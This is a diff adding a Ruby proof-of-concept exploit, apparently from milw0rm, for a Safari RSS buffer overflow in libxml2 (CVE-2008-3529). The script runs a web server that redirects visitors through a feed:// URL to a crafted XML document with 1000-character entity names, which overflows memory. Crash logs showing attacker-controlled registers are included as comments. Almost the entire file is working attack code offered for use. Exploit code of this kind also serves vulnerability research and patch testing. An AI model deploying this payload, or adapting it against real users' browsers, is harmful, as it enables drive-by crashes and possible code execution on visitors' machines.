@@ -1,0 +1,88 @@
+#!/usr/bin/ruby
+#
+# Quick-n-dirty PoC for APPLE-SA-2009-05-12 ala CVE-2008-3529
+# Safari RSS feed:// buffer overflow via libxml2 by KF of Digitalmunition and Netragard 
+# http://www.digitalmunition.com , http://www.netragard.com
+# 
+# The application PubSubAgent quit unexpectedly.
+#
+# Process:         PubSubAgent [3764]
+# Path:            /System/Library/Frameworks/PubSub.framework/Versions/A/Resources/PubSubAgent.app/Contents/MacOS/PubSubAgent
+# Identifier:      PubSubAgent
+# Version:         ??? (???)
+# Code Type:       X86 (Native)
+# Parent Process:  launchd [282]
+#
+# Date/Time:       2008-10-31 15:31:41.355 -0400
+# OS Version:      Mac OS X 10.5.5 (9F33)
+# Report Version:  6
+#
+# Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
+# Exception Codes: KERN_INVALID_ADDRESS at 0x0000000005050500
+#
+# Thread 0 crashed with X86 Thread State (32-bit):
+#  eax: 0x41414141  ebx: 0x94580535  ecx: 0x00136150  edx: 0x05050500
+#  edi: 0x00007000  esi: 0x00100000  ebp: 0xbfffe298  esp: 0xbfffe220
+#   ss: 0x0000001f  efl: 0x00010206  eip: 0x94580605   cs: 0x00000017
+#   ds: 0x0000001f   es: 0x0000001f   fs: 0x00000000   gs: 0x00000037
+#  cr2: 0x05050500
+#
+# On Windows libxml2.dll provides all the fun since there is no PubSubAgent
+# 
+# EAX 0131FB10 ASCII "AAAAAAAAAAA..."
+# ECX 003D0270
+# EDX 00000000
+# EBX 41414141
+# ESP 030FE6FC
+# EBP 030FE918
+# ESI 0131FB08 ASCII "AAAAAAAAAAA..."
+# EDI 41414141
+# EIP 7C919084 ntdll.7C919084
+# 
+# 7C919084   8B0B             MOV ECX,DWORD PTR DS:[EBX]
+# 7C919086   3B4F 04          CMP ECX,DWORD PTR DS:[EDI+4]
+
+
+require 'webrick'
+include WEBrick
+
+# Thats right... no one is taking on water, this is public info (and has been for a while)!
+# https://bugzilla.redhat.com/attachment.cgi?id=315480
+
+XML_LOVE =
+'<?xml version="1.0"?>' + "\n" +
+'<!DOCTYPE longentity [' + "\n" +
+'<!ELEMENT longentity (#PCDATA)>' + "\n" +
+'<!ENTITY ' +
+"A" * 1000 + " " +
+'"ha"> ]>' + "\n" +
+'<longentity location="&' +
+"A" * 1000 +
+';">text</longentity>' + "\n"
+
+REDIR_LOVE =
+'<meta http-equiv="REFRESH" content="0;url=feed://' + ARGV[0] + '/pwn">'
+
+s = HTTPServer.new( :Port => 80 )
+
+class REDIRECT < HTTPServlet::AbstractServlet
+ def do_GET(req, res)
+   res.body = REDIR_LOVE
+   res['Content-Type'] = "text/html"
+ end
+end
+
+class XMLLOVER < HTTPServlet::AbstractServlet
+ def do_GET(req, res)
+   res.body = XML_LOVE
+   res['Content-Type'] = "text/xml"
+ end
+end
+
+s.mount("/", REDIRECT)
+s.mount("/pwn", XMLLOVER)
+
+trap("INT"){ s.shutdown }
+s.start
+
+# milw0rm.com [2009-05-26]
